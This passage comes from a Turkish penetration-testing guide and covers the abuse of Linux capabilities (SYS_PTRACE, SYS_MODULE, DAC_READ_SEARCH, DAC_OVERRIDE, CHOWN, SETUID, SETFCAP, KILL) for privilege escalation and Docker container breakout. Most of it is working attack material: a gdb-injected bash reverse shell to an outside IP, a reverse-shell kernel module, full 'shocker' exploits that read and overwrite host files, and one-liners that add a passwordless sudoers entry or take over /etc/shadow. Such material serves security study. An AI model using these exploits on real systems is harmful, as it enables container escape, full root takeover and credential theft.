(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Komutun çıktısını göremeyeceksiniz ama bu işlem tarafından yürütülecektir (bu yüzden bir rev shell alın).

{% hint style="warning" %}
Eğer "No symbol "system" in current context." hatasını alırsanız, gdb aracılığıyla bir programda shellcode yükleyen önceki örneği kontrol edin.
{% endhint %}

**Ortam ile örnek (Docker breakout) - Shellcode Enjeksiyonu**

Docker konteyneri içinde etkinleştirilmiş yetenekleri kontrol edebilirsiniz:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
List **processes** running in the **host** `ps -eaf`

1. Get the **architecture** `uname -m`
2. Find a **shellcode** for the architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Find a **program** to **inject** the **shellcode** into a process memory ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. **Modify** the **shellcode** inside the program and **compile** it `gcc inject.c -o inject`
5. **Inject** it and grab your **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** bir sürece **çekirdek modüllerini yükleme ve kaldırma (`init_module(2)`, `finit_module(2)` ve `delete_module(2)` sistem çağrıları)** yetkisi verir, bu da çekirdeğin temel işlemlerine doğrudan erişim sağlar. Bu yetenek, çekirdekte değişiklik yaparak tüm Linux güvenlik mekanizmalarını, Linux Güvenlik Modülleri ve konteyner izolasyonu dahil olmak üzere, atlayarak ayrıcalık yükseltme ve toplam sistem tehlikesi oluşturma riski taşır.  
**Bu, ana makinenin çekirdeğine çekirdek modüllerini ekleyip kaldırabileceğiniz anlamına gelir.**

**Binary ile örnek**

Aşağıdaki örnekte **`python`** adlı binary bu yetkiye sahiptir.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Varsayılan olarak, **`modprobe`** komutu bağımlılık listesini ve harita dosyalarını **`/lib/modules/$(uname -r)`** dizininde kontrol eder.\
Bunu kötüye kullanmak için, sahte bir **lib/modules** klasörü oluşturalım:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Sonra **aşağıda bulabileceğiniz 2 örneği derleyin ve** bunu bu klasöre kopyalayın:**
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Son olarak, bu çekirdek modülünü yüklemek için gerekli python kodunu çalıştırın:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Örnek 2 ikili ile**

Aşağıdaki örnekte **`kmod`** ikilisi bu yetkiye sahiptir.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Bu, **`insmod`** komutunu kullanarak bir çekirdek modülü eklemenin mümkün olduğu anlamına gelir. Bu yetkiden yararlanarak bir **reverse shell** almak için aşağıdaki örneği takip edin.

**Ortam ile örnek (Docker breakout)**

Docker konteyneri içinde etkinleştirilen yetenekleri kontrol etmek için:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
İlk çıktıda **SYS\_MODULE** yetkisinin etkin olduğunu görebilirsiniz.

**Ters kabuk** çalıştıracak **kernel modülünü** ve bunu **derlemek** için **Makefile**'ı **oluşturun**:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% endcode %}

{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Makefile'deki her make kelimesinden önceki boş karakter **bir sekme olmalıdır, boşluk değil**!
{% endhint %}

Bunu derlemek için `make` komutunu çalıştırın.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Son olarak, bir shell içinde `nc` başlatın ve diğer bir shell'den **modülü yükleyin** ve nc sürecinde shell'i yakalayacaksınız:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Bu tekniğin kodu,** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **adresindeki "SYS\_MODULE Yetkisini Kötüye Kullanma" laboratuvarından kopyalanmıştır.**

Bu tekniğin bir başka örneği [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) adresinde bulunabilir.

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) bir sürecin **dosyaları okuma ve dizinleri okuma ve yürütme izinlerini atlamasına** olanak tanır. Birincil kullanımı dosya arama veya okuma amaçları içindir. Ancak, bu aynı zamanda bir sürecin `open_by_handle_at(2)` fonksiyonunu kullanmasına da izin verir; bu fonksiyon, sürecin montaj ad alanının dışındaki dosyalar da dahil olmak üzere herhangi bir dosyaya erişebilir. `open_by_handle_at(2)`'de kullanılan tanıtıcı, `name_to_handle_at(2)` aracılığıyla elde edilen şeffaf olmayan bir tanımlayıcı olmalıdır, ancak değiştirmeye karşı savunmasız olan inode numaraları gibi hassas bilgileri içerebilir. Bu yetkinin kötüye kullanılma potansiyeli, özellikle Docker konteynerleri bağlamında, Sebastian Krahmer tarafından şok edici bir istismar ile gösterilmiştir; bu konu [burada](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) analiz edilmiştir.  
**Bu, dosya okuma izin kontrolünü ve dizin okuma/yürütme izin kontrolünü atlayabileceğiniz anlamına gelir.**

**İkili ile örnek**

İkili, herhangi bir dosyayı okuyabilecektir. Yani, eğer tar gibi bir dosya bu yetkiye sahipse, gölge dosyasını okuyabilecektir:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Örnek binary2 ile**

Bu durumda **`python`** ikili dosyasının bu yetkiye sahip olduğunu varsayalım. Kök dosyalarını listelemek için şunu yapabilirsiniz:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Ve bir dosyayı okumak için şunu yapabilirsiniz:
```python
print(open("/etc/shadow", "r").read())
```
**Örnek Ortamda (Docker breakout)**

Docker konteyneri içindeki etkinleştirilmiş yetenekleri kontrol etmek için:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
İlk çıktıda **DAC\_READ\_SEARCH** yetkisinin etkin olduğunu görebilirsiniz. Sonuç olarak, konteyner **işlemleri hata ayıklayabilir**.

Aşağıdaki istismar yönteminin nasıl çalıştığını [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) adresinden öğrenebilirsiniz, ancak özetle **CAP\_DAC\_READ\_SEARCH** yalnızca dosya sisteminde izin kontrolleri olmadan gezinmemize izin vermekle kalmaz, aynı zamanda _**open\_by\_handle\_at(2)**_ için herhangi bir kontrolü açıkça kaldırır ve **işlemimizin diğer işlemler tarafından açılan hassas dosyalara erişmesine izin verebilir**.

Bu izinleri kullanarak ana bilgisayardan dosyaları okumak için kullanılan orijinal istismarı burada bulabilirsiniz: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), aşağıda **okumak istediğiniz dosyayı ilk argüman olarak belirtmenizi ve bir dosyaya dökmenizi sağlayan değiştirilmiş bir versiyon bulunmaktadır.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
Sömürü, ana makinede monte edilmiş bir şeye işaretçi bulmalıdır. Orijinal sömürü /.dockerinit dosyasını kullanıyordu ve bu değiştirilmiş versiyon /etc/hostname kullanıyor. Sömürü çalışmıyorsa, belki farklı bir dosya ayarlamanız gerekebilir. Ana makinede monte edilmiş bir dosyayı bulmak için sadece mount komutunu çalıştırın:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**Bu tekniğin kodu,** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **adresinden "DAC\_READ\_SEARCH Yetkisini Kötüye Kullanma" laboratuvarından kopyalanmıştır.**

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) **İspanya'daki en önemli siber güvenlik etkinliği ve Avrupa'daki en önemli etkinliklerden biridir.** **Teknik bilgiyi teşvik etme misyonuyla**, bu kongre, her disiplinde teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**Bu, herhangi bir dosya üzerindeki yazma izin kontrollerini atlayabileceğiniz anlamına gelir, böylece herhangi bir dosyayı yazabilirsiniz.**

Yetkileri artırmak için **üzerine yazabileceğiniz birçok dosya vardır,** [**buradan fikir alabilirsiniz**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**İkili ile örnek**

Bu örnekte vim bu yetkiye sahiptir, bu nedenle _passwd_, _sudoers_ veya _shadow_ gibi herhangi bir dosyayı değiştirebilirsiniz:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Örnek 2 ile**

Bu örnekte **`python`** ikili dosyası bu yetkiye sahip olacaktır. Herhangi bir dosyayı geçersiz kılmak için python kullanabilirsiniz:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Örnek ile ortam + CAP\_DAC\_READ\_SEARCH (Docker breakout)**

Docker konteyneri içinde etkinleştirilen yetenekleri kontrol etmek için:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Öncelikle, ev sahibinin rastgele dosyalarını okumak için [**DAC\_READ\_SEARCH yetkisini kötüye kullanır**](linux-capabilities.md#cap\_dac\_read\_search) bölümünü okuyun ve **istismarı derleyin**.\
Ardından, ev sahibinin dosya sisteminin içine **rastgele dosyalar yazmanıza** olanak tanıyacak **şok edici istismarın aşağıdaki sürümünü derleyin**:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Docker konteynerinden çıkmak için, ana bilgisayardan `/etc/shadow` ve `/etc/passwd` dosyalarını **indirin**, onlara **yeni bir kullanıcı** **ekleyin** ve bunları üzerine yazmak için **`shocker_write`** kullanın. Ardından, **ssh** üzerinden **erişim** sağlayın.

**Bu tekniğin kodu,** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) **adresindeki "DAC\_OVERRIDE Yetkisini Kötüye Kullanma" laboratuvarından kopyalanmıştır.**

## CAP\_CHOWN

**Bu, herhangi bir dosyanın sahipliğini değiştirmenin mümkün olduğu anlamına gelir.**

**İkili ile örnek**

Diyelim ki **`python`** ikilisi bu yetkiye sahip, **shadow** dosyasının **sahibini** **değiştirebilir**, **root şifresini** **değiştirebilir** ve ayrıcalıkları yükseltebilirsiniz:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Veya **`ruby`** ikili dosyasının bu yetkiye sahip olması:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**Bu, herhangi bir dosyanın izinlerini değiştirme olanağına sahip olduğunuz anlamına gelir.**

**İkili ile örnek**

Eğer python bu yetkiye sahipse, gölge dosyasının izinlerini değiştirebilir, **root şifresini değiştirebilir** ve ayrıcalıkları artırabilirsiniz:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**Bu, oluşturulan sürecin etkili kullanıcı kimliğini ayarlamanın mümkün olduğu anlamına gelir.**

**İkili ile örnek**

Eğer python bu **yetkiye** sahipse, bunu kök yetkilerine yükseltmek için çok kolay bir şekilde kötüye kullanabilirsiniz:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Başka bir yol:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**Bu, oluşturulan sürecin etkili grup kimliğini ayarlamanın mümkün olduğu anlamına gelir.**

Yetkileri artırmak için **üzerine yazabileceğiniz birçok dosya var,** [**buradan fikir alabilirsiniz**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**İkili ile örnek**

Bu durumda, herhangi bir grubu taklit edebileceğiniz için bir grubun okuyabileceği ilginç dosyaları aramalısınız:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Bir dosya bulduğunuzda (okuma veya yazma yoluyla) ayrıcalıkları artırmak için istismar edebilirsiniz, **ilginç grubu taklit eden bir shell alabilirsiniz**:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
Bu durumda grup shadow taklit edildi, böylece `/etc/shadow` dosyasını okuyabilirsiniz:
```bash
cat /etc/shadow
```
Eğer **docker** yüklüyse, **docker grubunu** taklit edebilir ve bunu [**docker soketi** ile iletişim kurmak ve ayrıcalıkları artırmak](./#writable-docker-socket) için kötüye kullanabilirsiniz.

## CAP\_SETFCAP

**Bu, dosyalar ve süreçler üzerinde yetenekler ayarlamanın mümkün olduğu anlamına gelir.**

**İkili ile örnek**

Eğer python bu **yetenek**e sahipse, bunu kök ayrıcalıklarını artırmak için çok kolay bir şekilde kötüye kullanabilirsiniz:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
Yeni bir yetkiyi CAP\_SETFCAP ile ikili dosyaya ayarlarsanız, bu yetkiyi kaybedeceksiniz.
{% endhint %}

Bir [SETUID yetkisi](linux-capabilities.md#cap\_setuid) aldıktan sonra, ayrıcalıkları nasıl artıracağınızı görmek için ilgili bölümüne gidebilirsiniz.

**Ortam ile örnek (Docker breakout)**

Varsayılan olarak, **CAP\_SETFCAP yetkisi Docker'daki konteyner içindeki işlemlere verilir**. Bunu kontrol etmek için şöyle bir şey yapabilirsiniz:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Bu yetenek, **binaries'e herhangi bir başka yetenek verme** imkanı tanır, bu nedenle bu sayfada bahsedilen **diğer yetenek kaçışlarını** istismar ederek konteynerden **kaçmayı** düşünebiliriz.\
Ancak, örneğin gdb binary'sine CAP\_SYS\_ADMIN ve CAP\_SYS\_PTRACE yeteneklerini vermeye çalışırsanız, bunları verebileceğinizi göreceksiniz, ancak **binary bundan sonra çalıştırılamayacaktır**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Bu, bir iş parçacığının üstlenebileceği **etkili yetenekler için sınırlayıcı bir süper kümedir**. Ayrıca, **CAP\_SETPCAP** yeteneğine sahip olmayan bir iş parçacığı tarafından miras alınabilir sete eklenebilecek yetenekler için de sınırlayıcı bir süper kümedir._\
Görünüşe göre, İzin verilen yetenekler kullanılabilecek olanları sınırlar.\
Ancak, Docker varsayılan olarak **CAP\_SETPCAP** verir, bu nedenle **miras alınabilir olanların içine yeni yetenekler ayarlayabilirsiniz**.\
Ancak, bu yeteneğin belgelerinde: _CAP\_SETPCAP : \[…] **çağrılan iş parçacığının sınırlayıcı** kümesinden miras alınabilir sete herhangi bir yetenek ekler_.\
Görünüşe göre, yalnızca sınırlayıcı kümeden miras alınabilir set yeteneklerine ekleme yapabiliyoruz. Bu da **yeni yetenekleri, örneğin CAP\_SYS\_ADMIN veya CAP\_SYS\_PTRACE'ı miras setine koyamayacağımız** anlamına geliyor.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `/dev/mem`, `/dev/kmem` veya `/proc/kcore` erişimi, `mmap_min_addr`'ı değiştirme, `ioperm(2)` ve `iopl(2)` sistem çağrılarına erişim ve çeşitli disk komutları dahil olmak üzere bir dizi hassas işlem sağlar. `FIBMAP ioctl(2)` de bu yetenek aracılığıyla etkinleştirilmiştir ve bu, [geçmişte](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) sorunlara neden olmuştur. Man sayfasına göre, bu aynı zamanda sahibine diğer cihazlarda tanımlayıcı bir şekilde `bir dizi cihaz spesifik işlemi gerçekleştirme` yetkisi verir.

Bu, **yetki yükseltme** ve **Docker kırılması** için faydalı olabilir.

## CAP\_KILL

**Bu, herhangi bir süreci öldürmenin mümkün olduğu anlamına gelir.**

**İkili ile örnek**

Diyelim ki **`python`** ikilisi bu yeteneğe sahip. Eğer **bir hizmet veya soket yapılandırma** (veya bir hizmetle ilgili herhangi bir yapılandırma dosyası) dosyasını da değiştirebilirseniz, arka kapı oluşturabilir ve ardından o hizmetle ilgili süreci öldürebilir ve yeni yapılandırma dosyasının arka kapınızla çalıştırılmasını bekleyebilirsiniz.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

Eğer kill yetkileriniz varsa ve **root olarak çalışan bir node programı** (veya farklı bir kullanıcı olarak) varsa, muhtemelen ona **SIGUSR1 sinyalini gönderebilir** ve **node hata ayıklayıcısını açmasını** sağlayabilirsiniz.
```bash
kill -s SIGUSR1 <nodejs-ps>
